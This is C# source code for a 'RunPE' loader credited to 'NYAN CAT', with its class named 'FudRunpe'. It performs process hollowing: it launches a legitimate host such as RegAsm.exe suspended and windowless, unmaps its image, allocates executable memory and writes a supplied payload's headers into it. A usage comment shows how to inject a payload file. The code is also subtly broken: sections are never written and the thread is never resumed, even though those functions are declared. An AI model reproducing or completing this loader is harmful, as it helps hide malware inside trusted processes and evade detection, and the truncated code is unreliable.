using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;

namespace RunPE
{
    /* 
           │ Author       : NYAN CAT
           │ Name         : RunPE
           │ Contact Me   : github.com/NYAN-x-CAT

           This program is distributed for educational purposes only.

        Usage:
        RunPE.Execute(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"), File.ReadAllBytes("Payload Path"));

    */

    class FudRunpe : NativeAPI
    {
        public static void Execute(string path, byte[] payload)
        {
            for(int i = 0; i < 5; i++)
            {
                int readWrite = 0;
                StartupInformation SI = new StartupInformation();
                ProcessInformation PI = new ProcessInformation();
                SI.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    bool CreateProc = CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref SI, ref PI);
                    if (!CreateProc)
                    {
                        throw new Exception();
                    }
                    int fileAddress = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, 0x3C });
                    int imageBase = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, fileAddress + 0x34 });
                    int[] context = new int[0xB3];
                    context[0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    {
                        bool GetThreadC = GetThreadContext(PI.ThreadHandle, context);
                        if (!GetThreadC)
                        {
                            throw new Exception();
                        }
                    }
                    else
                    {
                        bool Wow64GetThreadC = Wow64GetThreadContext(PI.ThreadHandle, context);
                        if (!Wow64GetThreadC)
                        {
                            throw new Exception();
                        }
                    }
                    int ebx = context[0x29];
                    int baseAddress = 0;
                    bool ReadProcessMem = ReadProcessMemory(PI.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite);
                    if (!ReadProcessMem)
                    {
                        throw new Exception();
                    }
                    if (imageBase == baseAddress)
                    {
                        int ZwUnmap = ZwUnmapViewOfSection(PI.ProcessHandle, baseAddress);
                        if (ZwUnmap != 0)
                        {
                            throw new Exception();
                        }
                    }
                    int sizeOfImage = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, fileAddress + 0x50 });
                    int sizeOfHeaders = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { payload, fileAddress + 0x54 });
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(PI.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
                    if (newImageBase == 0)
                    {
                        throw new Exception();
                    }
                    bool WriteProcessMem = WriteProcessMemory(PI.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite);
                    if (!WriteProcessMem)
                    {
                        throw new Exception();
                    }
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = (short)typeof(BitConverter).GetMethod("ToInt16").Invoke(null, new object[] { payload, fileAddress + 0x6 });
                }
                catch { }
            }
        }
    }

    class NativeAPI
    {
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        public struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        public struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern int ResumeThread(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        protected static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        protected static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
    }
}
